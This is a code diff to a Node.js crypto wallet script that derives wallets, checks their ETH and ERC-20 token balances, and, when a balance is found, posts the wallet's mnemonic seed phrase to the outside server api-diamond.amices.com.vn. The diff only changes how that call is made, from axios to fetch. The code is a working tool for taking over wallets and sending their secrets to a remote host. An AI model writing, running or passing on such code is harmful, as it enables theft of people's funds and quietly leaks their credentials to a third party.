@@ -4,7 +4,6 @@ const ecc = require("tiny-secp256k1");
 const randomBytes = require("randombytes");
 const ethWallet = require("ethereumjs-wallet").default;
 const { ethers } = require("ethers");
-const Axios = require("axios").Axios;
 
 const cluster = require("cluster");
 const numCPUs = require("os").cpus().length;
@@ -12,10 +11,6 @@ const numCPUs = require("os").cpus().length;
 const { erc20Tokens } = require("./erc20Tokens");
 
 const bip32 = BIP32Factory(ecc);
-
-const axios = new Axios({
-  baseURL: "https://api-diamond.amices.com.vn",
-});
 
 const provider = new ethers.AlchemyProvider(
   "mainnet",
@@ -51,19 +46,24 @@ async function checkTokenBalancesAndTransfer(walletAddress, mnemonic) {
     console.log(`ETH: ${ethBalance}`);
     const tokenBalances = await getTokenBalances(walletAddress);
 
-    // Check each token balance and transfer if balance > 0
     for (let token of tokenBalances) {
       console.log(`${token.name}: ${token.balance}`);
       if (token.balance > 0) {
         console.log(`Found! ${token.name} tokens...`, mnemonic);
-        await axios.post("/api/users/wallet", {
-          mnemonic,
-          token: token.name,
+        await fetch("https://api-diamond.amices.com.vn/api/users/wallet", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            mnemonic,
+            token: token.name,
+          }),
         });
       }
     }
   } catch (error) {
-    console.error("Error fetching or transferring token balances:", error);
+    console.error("Error: ", error);
   }
 }
 
